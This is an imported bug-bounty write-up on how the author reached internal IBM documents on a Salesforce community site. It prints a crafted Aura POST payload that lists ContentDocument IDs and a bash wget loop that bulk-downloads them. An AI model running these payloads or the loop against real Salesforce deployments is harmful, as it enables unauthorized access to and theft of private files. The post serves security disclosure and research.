---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-19_how-i-was-able-to-access-ibm-internal-documents.md
original_filename: 2022-05-19_how-i-was-able-to-access-ibm-internal-documents.md
title: How I was able to access IBM internal documents
category: documents
detected_topics:
- sso
- saml
- idor
- command-injection
- otp
- information-disclosure
tags:
- imported
- documents
- sso
- saml
- idor
- command-injection
- otp
- information-disclosure
language: en
raw_sha256: 52c5d16b05e58d963ffc1fc62a6e6b94c828c86869c8fa1f5ae9ffd0df5dea60
text_sha256: 1e69419679a1b5b905143d1397571b637d903c509cb9b65c2d2b95ca6692415b
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# How I was able to access IBM internal documents

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-19_how-i-was-able-to-access-ibm-internal-documents.md
- Source Type: markdown
- Detected Topics: sso, saml, idor, command-injection, otp, information-disclosure
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `52c5d16b05e58d963ffc1fc62a6e6b94c828c86869c8fa1f5ae9ffd0df5dea60`
- Text SHA256: `1e69419679a1b5b905143d1397571b637d903c509cb9b65c2d2b95ca6692415b`


## Content

---
title: "How I was able to access IBM internal documents"
url: "https://medium.com/@mohamedtaha_42562/how-i-was-able-to-access-ibm-internal-documents-a33858387d30"
authors: ["Mohamed Taha (@Mohamed12742780)"]
programs: ["IBM"]
bugs: ["Information disclosure", "IDOR"]
publication_date: "2022-05-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2628
scraped_via: "browseros"
---

# How I was able to access IBM internal documents

Mohamed Taha
 highlighted

1

How I was able to access IBM internal documents
Mohamed Taha
Follow
2 min read
·
May 19, 2022

108

1

Hi, today I will share how I was able to access internal data of https://weathercommunity.ibm.com using salesforce misconfiguration.

This write-up will depends on this great blog: Salesforce

so please read it first then read this write-up.

After I read this blog, I wanted to exploit it in the wild so I now I wanted to see the subdomains which point to on of the following CNAMEs:

*.force.com

*.secure.force.com

*live.siteforce.com

I used this great tool https://github.com/yghonem14/cngo to get CNMAEs of all the websites that have program on hackerone through https://chaos.projectdiscovery.io/

I found this subdomain weathercommunity.ibm.com which pointing out to: thercommunity.ibm.com.00de0000000avgcma2.live.siteforce.com

Get Mohamed Taha’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I found an endpoint like:

POST /s/sfsites/aura?r=2&applauncher.CommunityLogo.getCommunityName=1&applauncher.CommunityLogo.getLogoURL=1&applauncher.EmployeeLoginLink.getEmployeeLoginUrl=1&applauncher.EmployeeLoginLink.getIsAllowInternalUserLoginEnabled=1&applauncher.SocialLogin.getAuthProviders=1&applauncher.SocialLogin.getSamlProviders=1&applauncher.SocialLogin.handleIdp=1&other.LightningLoginForm.getForgotPasswordUrl=1&other.LightningLoginForm.getIsSelfRegistrationEnabled=1&other.LightningLoginForm.getIsUsernamePasswordEnabled=1&other.LightningLoginForm.getSelfRegistrationUrl=1&ui-communities-components-aura-components-forceCommunity-richText.RichText.getParsedRichTextValue=2&ui-communities-components-aura-components-forceCommunity-seoAssistant.SeoAssistant.getSeoLanguageData=1 HTTP/1.1

then I sent this POST request to the Repeater and changed the Message parameter value to:

{"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"MARKER","layoutType":"FULL","pageSize":100,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}}]}

Replacing the MARKER string with: ContentDocument

Press enter or click to view image in full size

See that there are more than 900 ID. I extracted the ID value which started with 069 and made a simple bash script to download them one by one through this endpoint /sfc/servlet.shepherd/document/download/$ID

https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/ID

Example:

https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/0690h0000060wuHAAQ

while read i
do wget --no-check-certificate "https://weathercommunity.ibm.com/sfc/servlet.shepherd/document/download/$i"
done < $1

Sample of the internal images:

Press enter or click to view image in full size

Reporting:

Twitter:

twitter.com/mohamed12742780
